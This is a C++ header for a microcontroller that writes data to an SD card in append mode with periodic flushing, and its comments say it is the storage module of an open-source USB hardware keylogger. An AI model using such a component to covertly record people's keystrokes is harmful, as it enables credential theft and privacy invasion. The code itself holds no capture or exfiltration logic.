#ifndef EMBD_ENV_SDOUTPUTHANDLER_H
#define EMBD_ENV_SDOUTPUTHANDLER_H

// Result propagation via SD card for USB keylogger
// See https://github.com/gereonsuch/keylogger for more information
// Copyright (C) 2026 Gereon Such

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

#include <Arduino.h>
#include <SPI.h>
#include <SdFat.h>

template <uint32_t min_flush_interval = 3000u, // default flush every 3 secs
    unsigned PIN_MISO = 16,
    unsigned PIN_MOSI = 19,
    unsigned PIN_SCK = 18,
    unsigned PIN_CS = 17,
    uint32_t BAUD_RATE = 12'000'000UL>
class SDCardOutputHandler {
    
    SdFat _sd;
    FsFile _file;
    bool _initialized = false;
    uint32_t _last_flush {0};
    uint32_t _last_open_call {0};

    template<class SPI_BUS>
    bool mount(SPI_BUS& spi) {
        SdSpiConfig config(PIN_CS, DEDICATED_SPI, BAUD_RATE, &spi);
        _initialized = _sd.begin(config);
        return _initialized;
    }

    void closeFile() { if (_file) _file.close(); }

public:

    template<class SPI_BUS>
    bool openFile(SPI_BUS& spi, const char* filename) {
        _last_open_call = millis();
        if (! _initialized && ! mount(spi)) return false;
        closeFile();
  
        _file = _sd.open(filename, O_WRONLY | O_CREAT | O_APPEND);
        return _file.operator bool();
    }

    uint32_t timeSinceLastOpenCall() const {
        if(_last_open_call == 0u) return 0u;
        return millis() - _last_open_call;
    }

    template<class SPI_BUS>
    bool init(SPI_BUS& spi) {
        spi.setRX(PIN_MISO);
        spi.setTX(PIN_MOSI);
        spi.setSCK(PIN_SCK);
        spi.begin();
        return mount(spi);
    }
 
    template<class SPI_BUS>
    bool writeBytes(SPI_BUS& spi, const char* data, size_t length) {
        if (data == nullptr || length <= 0u) return false;
        if(! _initialized && ! mount(spi)) return false; // trys to mount if not already mounted. 
        if(! _file) return false; // not opened
 
        size_t written = _file.write(data, length);
 
        if(written != length) { // error on write
            closeFile();
            _initialized = false;
            return false;
        }

        if(min_flush_interval > 0u) {
            uint32_t now = millis();
            if(_last_flush == 0u) _last_flush = now;

            if(now - _last_flush > min_flush_interval)
                flush();
        }
 
        return true;
    }

    bool flush() {
        if (!_file) return false;
        return _file.sync();
    }
 
    bool isInitialized() const { return _initialized; }
    SdFat& fs() { return _sd; }
};


#endif // EMBD_ENV_SDOUTPUTHANDLER_H
